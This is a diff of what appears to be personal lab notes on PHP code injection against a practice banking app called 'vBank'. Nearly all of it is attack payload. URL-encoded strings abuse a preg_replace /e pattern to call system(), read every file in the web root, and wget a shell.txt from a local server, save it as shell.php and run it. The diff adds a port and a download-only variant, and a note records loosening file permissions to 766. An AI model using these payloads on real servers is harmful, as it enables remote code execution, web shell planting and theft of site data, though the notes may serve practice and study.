@@ -58,8 +58,10 @@ https://www.php.net/manual/en/function.exec.php
 	
    '.system('find /var/www/html/vBank/ *').'
    '.system('find /var/www/html/vBank/ * -exec cat {} \;').'
-7) %22[1]\b%23e%27,%20system('wget http://127.0.0.1/shell.txt -O shell.php; php -f shell.php'),%20%27%1%27);%20preg_replace(%27%23\b%22
-   '.system('wget http://127.0.0.1/shell.txt -O shell.php; php -f shell.php').'
+7) %22[1]\b%23e%27,%20system('wget http://127.0.0.1:8002/shell.txt -O shell.php; php -f shell.php'),%20%27%1%27);%20preg_replace(%27%23\b%22
+   '.system('wget http://127.0.0.1:8002/shell.txt -O shell.php; php -f shell.php').'
+
+   '.system('wget http://127.0.0.1:8002/shell.txt -O shell.php').'
    
    had to change the file permissions manually as it was set to 744
    sudo chmod 766 htbmain.page
